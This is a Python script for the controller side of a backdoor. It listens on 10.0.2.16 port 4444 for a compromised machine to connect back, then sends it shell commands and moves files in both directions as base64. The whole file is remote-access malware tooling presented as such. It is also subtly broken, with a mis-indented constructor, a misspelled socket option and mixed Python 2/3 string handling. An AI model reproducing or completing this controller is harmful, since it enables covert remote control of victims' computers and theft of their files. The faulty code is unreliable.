#!/usr/bin/env python3

import socket # to create connection
import json # for backdoor serialization
import base64

class Listener:
	def __init__(self, ip, port):
	listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADOR, 1) # to reuse socket if connection lost
	listener.bind((ip, port)) # wait for incoming connections
	listener.listen(0) # 0 is backlog
	print("[+] waiting for incoming connections")
	self.connection, address = listener.accept()
	print ("[+] connection received from " + str(address))

	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data)

	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data += self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue

	def execute_remotely(self, command):
		self.reliable_send(command)
		if command[0] == "exit":
			self.connection.close()
			exit()
		return self.reliable_receive()

	def write_file(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
			return "[+] upload successful!"

	def read_file(self, path):
		with open(path, "rb") as file: # treat file as read + binary
			return base64.b64encode(file.read())

	def run(self):
		while True:
			command = input(">> ")
			command = command.split(" ")
			try:
				if command[0] == "upload":
					file_content = self.read_file(command[1])
					command.append(file_content) # append content of file to list
				result = self.execute_remotely(command)
				if command[0] == "download" and "[-] error " not in result:
					result = self.write_file(command[1], result)
          
			except Exception:
				result = "[-] error during command execution :("
			print(result)
my_listener = Listener("10.0.2.16", 4444)
my_listener.run()
